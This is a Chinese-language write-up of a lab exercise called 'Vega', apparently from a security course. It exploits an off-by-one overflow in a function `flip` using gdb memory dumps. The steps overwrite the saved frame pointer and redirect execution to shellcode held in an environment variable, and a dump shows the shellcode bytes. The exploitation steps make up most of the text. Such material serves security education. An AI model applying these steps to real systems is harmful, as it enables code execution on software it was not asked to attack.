# Vega

## Main Idea

根据提示，我们需要利用Off-By-One漏洞。在函数`flip`中，由于边界条件不正确，导致缓冲区出现单字节溢出。

## Magic Numbers

基于上述原理，我们需要收集如下信息：shellcode的地址(shellcode位于环境变量中)、缓冲区的地址以及最内层函数的返回地址：
```
(gdb) p &buf
$1 = (char (*)[64]) 0xffffd9d0
```

```
(gdb) i f
Stack level 1, frame at 0xffffda18:
 eip = 0x804925d in invoke (flipper.c:19); saved eip = 0x804927a
 called by frame at 0xffffda24, caller of frame at 0xffffd9c8
 source language c.
 Arglist at 0xffffda10, args: in=0xffffdbb7 'A' <repeats 48 times>, "\274\377\337߼\377\337\337AAAAAAAA "
 Locals at 0xffffda10, Previous frame's sp is 0xffffda18
 Saved registers:
  ebp at 0xffffda10, eip at 0xffffda14
```

```
(gdb) p environ[4]
$1 = 0xffffdf98 "EGG=j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/bin\211\343PRQS\211\341\061Ұ\v̀"
(gdb) p &environ[4]
$2 = (char **) 0xffffdac0
(gdb) 
```

## Exploit Structure

1. 我们先将`buf`填满，看看应该在`buf`的哪个位置插入shellcode的起始地址：
    ```
    (gdb) x/20x &buf
    0xffffd9d0:     0x00000000      0x00000001      0x00000000      0xffffdb8b
    0xffffd9e0:     0x00000002      0x00000000      0x00000000      0x00000000
    0xffffd9f0:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
    0xffffda00:     0x00000000      0x00000000      0x00000000      0x00000000
    0xffffda10:     0xffffda1c      0x0804927a      0xffffdbb7      0xffffda28
    ```
    `sfp`在`0xffffda10`中，该处的值指向`0xffffda1c`，将最后一个字节修改为0，因此我们在`0xffffda00`处插入地址。
2. 将`buf`的剩余部分填充
3. 最后加上空字节0，注意由于函数中有异或操作，所以我们实际插入的是`\x20`

## Exploit GDB Output

进行爆破前：
```
(gdb) x/20x &buf
0xffffd9d0:     0x00000000      0x00000001      0x00000000      0xffffdb8b
0xffffd9e0:     0x00000002      0x00000000      0x00000000      0x00000000
0xffffd9f0:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
0xffffda00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffda10:     0xffffda1c      0x0804927a      0xffffdbb7      0xffffda28
```

进行爆破后：
```
(gdb) x/20x &buf
0xffffd9d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd9e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd9f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffda00:     0xffffdf9c      0xffffdf9c      0x61616161      0x61616161
0xffffda10:     0xffffda00      0x0804927a      0xffffdbb7      0xffffda28
```